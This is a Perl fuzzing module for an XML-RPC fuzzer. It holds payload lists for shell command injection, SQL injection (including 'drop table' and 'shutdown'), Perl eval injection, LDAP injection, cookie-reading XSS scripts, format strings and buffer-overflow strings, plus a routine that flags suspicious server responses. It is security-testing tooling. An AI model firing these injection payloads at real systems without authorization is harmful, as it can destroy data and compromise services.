#!/usr/bin/perl

#use strict;
use utf8;
use Data::Dumper;
use URI::Escape;
use Digest::MD5 qw(md5 md5_hex md5_base64);

$log_fuzz = 0;
$file_pat = "";

package Fuzz;

#
# shell meta chars
#
our @shell_data = (
	"../",
	"/../",
	"/../../../",
	">//",
	">",
	"<",
        "`",
        "\$(",
        "|",
        "&",
        "exec",
        "eval",
        "&&",
        "||",
        "`/usr/bin/id`",
        "\$(/usr/bin/id)",
        "|/usr/bin/id",
	"%0A/usr/bin/id",
        "&/usr/bin/id",
        " exec /usr/bin/id",
        " eval '/usr/bin/id'",
        "; exec /usr/bin/id",
        "; eval '/usr/bin/id'",
        "| exec /usr/bin/id",
        "| eval '/usr/bin/id'",
        "& exec /usr/bin/id",
        "& eval '/usr/bin/id'",
        "|| exec /usr/bin/id",
        "|| eval '/usr/bin/id'",
        "&& exec /usr/bin/id",
        "&& eval '/usr/bin/id'",
        "&& /usr/bin/id",
        "|| /usr/bin/id",
	";",
	"'",
	"\"",
	"\\",
	"(",
	")",
	"[",
	"]",
	"%",
	" -",
	" --",
	"\n"
);
our $shell_idx = 0;
sub shell_set($)
{
	$shell_idx = $_
}
sub shell_reset()
{
	$shell_idx = 0;
}
sub shell_more()
{
	return 0 if($shell_idx > $#shell_data);
	return 1;
}

sub shell()
{
	print "shell idx: $shell_idx, length: ", $#shell_data, "\n" if($log_fuzz);
	return undef if($shell_idx > $#shell_data);
	my $s = $shell_data[$shell_idx];
	$shell_idx++;
	return $s;
}

#
# format strings
#
our @fmt_data = (
        "\%i",
        "\%p",
	"\%s",
        "\%n"
);
our $fmt_idx = 0;
sub fmt_set($)
{
	$fmt_idx = $_
}
sub fmt_reset()
{
	$fmt_idx = 0;
}
sub fmt_more()
{
	return 0 if($fmt_idx > $#fmt_data);
	return 1;
}
sub fmt()
{
	print "fmt idx: $fmt_idx, length: ", $#fmt_data, "\n" if($log_fuzz);
	return undef if($fmt_idx > $#fmt_data);
	my $s = $fmt_data[$fmt_idx];
	$fmt_idx++;
	return $s;
}

#
# SQL injections
#
our @sql_data = (
        "'",
	"\"",
        ";",
        "#",
        "\\",
        "\$",
        "%",
        "(",
        "{",
        ")",
        "}",
	"/*",
	"--",
        "''; drop table UNKOWN--",
        "'';shutdown--",
        "'; drop table UNKOWN--",
        "';shutdown--",
        "; drop table UNKOWN--",
        ";shutdown--",
        "test'--",
	"' OR 1=1",
	"' OR 1=1 --"
);
our $sql_idx = 0;
sub sql_set($)
{
	$sql_idx = $_
}
sub sql_reset()
{
	$sql_idx = 0;
}
sub sql_more()
{
	return 0 if($sql_idx > $#sql_data);
	return 1;
}
sub sql()
{
	print "sql idx: $sql_idx, max: ", $#sql_data, "\n" if($log_fuzz);
	return undef if($sql_idx > $#sql_data);
	my $s = $sql_data[$sql_idx];
	$sql_idx++;
	return $s;
}

#
# Perl injections
#
our @perl_data = (
        "`",
        "<",
        "\$(",
        "|",
        "&",
        "exec",
        "eval",
        "eval()",
        "&&",
        "||",
        "`/usr/bin/id`",
        "<`/usr/bin/id`>",
        "\$(/usr/bin/id)",
        "|/usr/bin/id",
        "&/usr/bin/id",
        " exec /usr/bin/id",
        " eval '/usr/bin/id'",
        " eval('/usr/bin/id')",
        "; exec /usr/bin/id",
        "; eval '/usr/bin/id'",
        "; eval('/usr/bin/id')",
        "| exec /usr/bin/id",
        "| eval '/usr/bin/id'",
        "| eval('/usr/bin/id')",
        "& exec /usr/bin/id",
        "& eval '/usr/bin/id'",
        "& eval('/usr/bin/id')",
        "|| exec /usr/bin/id",
        "|| eval '/usr/bin/id'",
        "|| eval('/usr/bin/id')",
        "&& exec /usr/bin/id",
        "&& eval '/usr/bin/id'",
        "&& eval('/usr/bin/id')",
        "&& /usr/bin/id",
        "|| /usr/bin/id",
);
our $perl_idx = 0;
sub perl_set($)
{
	$perl_idx = $_
}
sub perl_reset()
{
	$perl_idx = 0;
}
sub perl_more()
{
	return 0 if($perl_idx > $#perl_data);
	return 1;
}
sub perl()
{
	print "perl idx: $perl_idx, length: ", $#perl_data, "\n" if($log_fuzz);
	return undef if($perl_idx > $#perl_data);
	my $s = $perl_data[$perl_idx];
	$perl_idx++;
	return $s;
}

#
# ldap injections
#
our @ldap_data = (
        "; cn=",
        "; cn=test| ",
        "; cn=test& ",
        "; cn=test( ",
        "|(cn=",
        "|(cn=test| ",
        "|(cn=test& ",
        "|(cn=test( ",
);
our $ldap_idx = 0;
sub ldap_set($)
{
	$ldap_idx = $_
}
sub ldap_reset()
{
	$ldap_idx = 0;
}
sub ldap_more()
{
	return 0 if($ldap_idx > $#ldap_data);
	return 1;
}
sub ldap()
{
	print "ldap idx: $ldap_idx, length: ", $#ldap_data, "\n" if($log_fuzz);
	return undef if($ldap_idx > $#ldap_data);
	my $s = $ldap_data[$ldap_idx];
	$ldap_idx++;
	return $s;
}

#
# HTML and JavaScript
#
our @html_data = (
        "><br>XMLRPC FUZZER<",
	"<br>XMLRPC FUZZER<br>",
	"<b>bold</b>",
	"%0A<b>bold</b>",
	"<!--#exec cmd=\"/bin/ls /\" -->",
	"<script type=\"text/javascript\">alert(\"XSS Test 1: \"+document.cookie)</script>",
	"%0A<script type=\"text/javascript\">alert(\"XSS Test 2: \"+document.cookie)</script>",
	"<img src=javascript:alert('XSS Test 3')>",
	"<table background=\"javascript:alert('XSS Test 4')\">",
	"<IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;>"
);
our $html_idx = 0;
sub html_set($)
{
	$html_idx = $_
}
sub html_reset()
{
	$html_idx = 0;
}
sub html_more()
{
	return 0 if($html_idx > $#html_data);
	return 1;
}
sub html()
{
	print "html idx: $html_idx, length: ", $#html_data, "\n" if($log_fuzz);
	return undef if($html_idx > $#html_data);
	my $s = $html_data[$html_idx];
	$html_idx++;
	return $s;
}

#
# random data
#
# just a dummy
our @rnd_data = (
	"0",
        "1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9"
);
our $rnd_idx = 0;
sub rnd_set($) # XXX this makes no sense
{
	$rnd_idx = $_
}
sub rnd_reset()
{
	$rnd_idx = 0;
}
sub rnd_more()
{
	return 0 if($rnd_idx > $#rnd_data);
	return 1;
}
sub rnd()
{
	print "rnd idx: $rnd_idx, length: ", $#rnd_data, "\n" if($log_fuzz);
	return undef if($rnd_idx > $#rnd_data);

	open RND, "< /dev/urandom";
	binmode(RND);
	my $s ="";
	read(RND, $s, 20);
	close RND;

	$rnd_idx++;
	return $s;
}


#
# read fuzz data from file, for example fuzzdb 
#
our @file_data = ();

our $file_idx = 0;
sub file_set($)
{
	$file_idx = shift;
	return unless(defined($file_idx));
	return if(length($file_pat) == 0);
	foreach my $fn (glob($file_pat))
	{
		open FD_file, $fn || die "Fuzz:file_set() unable to open file \'$fn\' with pattern \'$file_pat\'\n";
		while(<FD_file>)
		{
			chomp;
			next if /^#.*/;
			push @file_data, $_;
		}
		close FD_file;
	}
}
sub file_reset()
{
	$file_idx = 0;
	@file_data = ();
	return if(length($file_pat) == 0);
	file_set(0);
}
sub file_more()
{
	return 0 if($file_idx > $#file_data);
	return 1;
}
sub file()
{
	print "file idx: $file_idx, length: ", $#file_data, "\n" if($log_fuzz);
	return undef if($file_idx > $#file_data);

	my $s = $file_data[$file_idx];
	$file_idx++;
	return $s;
}

#
# generate long string (length reduced after each call)
# for buffer overflow triggerig
#
our $bof_max = 4100;
our $bof_idx = $bof_max;
our $bof_idx_dec = 100;
sub bof_set($)
{
	$bof_idx = $_
}
sub bof_reset()
{
	$bof_idx = $bof_max;
}
sub bof_more()
{
	return 0 if($bof_idx <= $bof_idx_dec);
	return 1;
}
sub bof()
{
	print "bof idx: $bof_idx, length: ", $bof_max, "\n" if($log_fuzz);
	return undef if($bof_idx <= $bof_idx_dec);
	$bof_idx = $bof_idx - $bof_idx_dec;
	return "A" x $bof_idx;
}

#
# generate big integer (int32)
# from high to low
#
our $int32_max = 2147483647;
our $int32_min = -2147483646;
our $int32_idx = $int32_max;
sub int32_set($)
{
	my $i = shift;
	$i = $int32_max if($i > $int32_max);
	$i = $int32_min if($i < $int32_min);
	$int32_idx = $i;
}
sub int32_reset()
{
	$int32_idx = $int32_max;
}
sub int32_more()
{
	return 0 if($int32_idx < $int32_min);
	return 1;
}
sub int32()
{
	print "int32 idx: $int32_idx\n" if($log_fuzz);
	return undef if($int32_idx < $int32_min);
	my $i = $int32_idx;
	$int32_idx = $int32_idx - 100000;
	return $i;
}

# this causes an int overflow in perl
# generate big integer (int64)
# from high to low
#
# our $int64_max = 0x7FFFFFFFFFFFFFFF;
# our $int64_min = 0x8000000000000000;
# our $int64_idx = $int64_max;
# sub int64_set($)
# {
# 	my $i = shift;
# 	$i = $int64_max if($i > $int64_max);
# 	$i = $int64_min if($i < $int64_min);
# 	$int64_idx = $i;
# }
# sub int64_reset()
# {
# 	$int64_idx = $int64_max;
# }
# sub int64()
# {
# 	print "int64 idx: $int64_idx\n" if($log_fuzz);
# 	return undef if($int64_idx < $int64_min);
# 	my $i = $int64_idx;
# 	$int64_idx = $int64_idx - 1000000;
# 	return $i;
# }

#
# generate big integer (uint32)
# from high to low
#
our $uint32_max = 4294967295;
our $uint32_min = 0;
our $uint32_idx = $uint32_max;
sub uint32_set($)
{
	my $i = shift;
	$i = $uint32_max if($i > $uint32_max);
	$i = $uint32_min if($i < $uint32_min);
	$uint32_idx = $i;
}
sub uint32_reset()
{
	$uint32_idx = $uint32_max;
}
sub uint32_more()
{
	return 0 if($uint32_idx < $uint32_min);
	return 1;
}
sub uint32()
{
	print "uint32 idx: $uint32_idx\n" if($log_fuzz);
	return undef if($uint32_idx < $uint32_min);
	my $i = $uint32_idx;
	$uint32_idx = $uint32_idx - 100000;
	return $i;
}

#
# generate big integer (uint64)
# from high to low
#
# our $uint64_max = 0xFFFFFFFFFFFFFFFF;
# our $uint64_min = 0x00;
# our $uint64_idx = $uint64_max;
# sub uint64_set($)
# {
# 	my $i = shift;
# 	$i = $uint64_max if($i > $uint64_max);
# 	$i = $uint64_min if($i < $uint64_min);
# 	$uint64_idx = $i;
# }
# sub uint64_reset()
# {
# 	$uint64_idx = $uint64_max;
# }
# sub uint64()
# {
# 	print "uint64 idx: $uint64_idx\n" if($log_fuzz);
# 	return undef if($uint64_idx < $uint64_min);
# 	my $i = $uint64_idx;
# 	$uint64_idx = $uint64_idx - 1000000;
# 	return $i;
# }

#
# end of line
#
our @eol_data = (
	#"",
	"\r",
	"\n",
	"\r\n"
);
our $eol_idx = 0;
sub eol_set($)
{
	$eol_idx = $_
}
sub eol_reset()
{
	$eol_idx = 0;
}
sub eol_more()
{
	return 0 if($eol_idx > $#eol_data);
	return 1;
}
sub eol()
{
	print "eol idx: $eol_idx, length: ", $#eol_data, "\n" if($log_fuzz);
	return undef if($eol_idx > $#eol_data);
	my $s = $eol_data[$eol_idx];
	$eol_idx++;
	return $s;
}

#
# separator
#
our @sep_data = (
	"\x00",
	"\x01",
	"\x02",
	"\x03",
	"\x04",
	"\x1c",
	"\x1d",
	"\x1e",
	"\x1f",
	"\r",
	"\n",
	"\r\n",
	",",
	":",
	"\t",
	"|",
	":",
	"."
);
our $sep_idx = 0;
sub sep_reset()
{
	$sep_idx = 0;
}
sub sep_more()
{
	return 0 if($sep_idx > $#sep_data);
	return 1;
}
sub sep()
{
	return undef if($sep_idx > $#sep_data);
	my $s = $sep_data[$sep_idx];
	$sep_idx++;
	return $s;
}


# a hash of function pointers to our fuzz functions
our %func_tab =
(
	"shell"  =>\&shell,
	"html"   =>\&html,
	"fmt"    =>\&fmt,
	"sql"    =>\&sql,
	"ldap"   =>\&ldap,
	"eol"    =>\&eol,
	"sep"    =>\&sep,
	"bof"    =>\&bof,
	"int32"  =>\&int32,
# 	"int64"  =>\&int64,
	"uint32" =>\&int32,
# 	"uint64" =>\&int64,
	"rnd"    =>\&rnd,
	"file"   =>\&file
);

our %h_fuzzconf = (
	"shell"	=>0,
	"html"	=>0,
	"fmt"	=>0,
	"bof"	=>0,
	"int32"	=>0,
# 	"int64"	=>0,
	"uint32"=>0,
# 	"uint64"=>0,
	"sql"	=>0,
	"ldap"	=>0,
	"eol"	=>0,
	"sep"	=>0,
	"rnd"	=>0,
	"file"	=>0
);

sub reset_all()
{
	foreach my $k (keys %func_tab)
	{
		my $f = $k."_reset";
		&{$f}();
		#my $f = $k."_idx";
		#$$f = 0; XXX this is not always 0
	}
}

sub reset_type($)
{
	my $type = shift;
	my $f = $type."_reset";
	print "calling $f\n";
	&{$f}();
	#my $f = $type."_idx";
	#$$f = 0; XXX this is not always 0
}


sub more_avail($)
{
	my $k = shift;
	my $f = $k."_more";
	return &{$f}();
}


#
# Analyze the result
#
our $RES_ERR_XMLROOT = -1;
our $RES_OK = 0;

# returns (err code, count fuzzed, count suspicious, [array of tag names])
use Data::Dumper;
sub analyze($;$;$;$;$)
{
	my $href_tmpl = shift;
	my $href_fuzz = shift;
	my $href_res = shift;
	my $fuzz_type = shift;
	my $http_rc = shift;

	my $cnt_fuzzed_tags = 0;
	my $cnt_sus_result = 0;

	my @sus_tags = ();

	# lets see what is in the result of the data we sent
	foreach my $xml_root (keys %$href_fuzz)
	{
		return ($RES_ERR_XMLROOT, 0, 0, undef) unless(defined($href_res->{$xml_root}));

		foreach my $xml_tag (keys %{$href_fuzz->{$xml_root}})
		{
			# did we fuzzed it
			next unless($href_tmpl->{$xml_root}->{$xml_tag} =~ /FUZZ/);
			$cnt_fuzzed_tags++;

			# tag does not appear in HTTP/XML response
			next unless(defined($href_res->{$xml_root}->{$xml_tag}));

			# the fuzzed string was equal to the result, what does it mean:
			# 1. no error occured whle reading the str from the network
			# 2. no error occured while writing the str to an internal database
			# 3. no error occured while reading the str from the database
			# 4. no error occured while sending the str back to the client
			# 5. but this could still be a problematic str in the Web-UI for HTML fuzzing
			my $str_res  = $href_res->{$xml_root}->{$xml_tag};
			my $str_fuzz = $href_fuzz->{$xml_root}->{$xml_tag};
			my $esc_res = URI::Escape::uri_escape_utf8($str_res);
			my $esc_fuzz = URI::Escape::uri_escape_utf8($str_fuzz);
			if($esc_res eq $esc_fuzz)
			{
				# we want HTML tags that are not modified b/c they may
				# result in injection attacks via the web-ui
				next unless($fuzz_type =~ /html/i);
			}
			
			$sus_tags[$cnt_sus_result] = sprintf("%s[%s]='%s'",
				$xml_root,
				$xml_tag,
				$str_res);
			unless($fuzz_type =~ /html/i)
			{
				$sus_tags[$cnt_sus_result] = sprintf("%s expected '%s'", $sus_tags[$cnt_sus_result], $str_fuzz);
			}
			$cnt_sus_result++;

		}
	}
	return($RES_OK, $cnt_fuzzed_tags, $cnt_sus_result, \@sus_tags);
}

1;
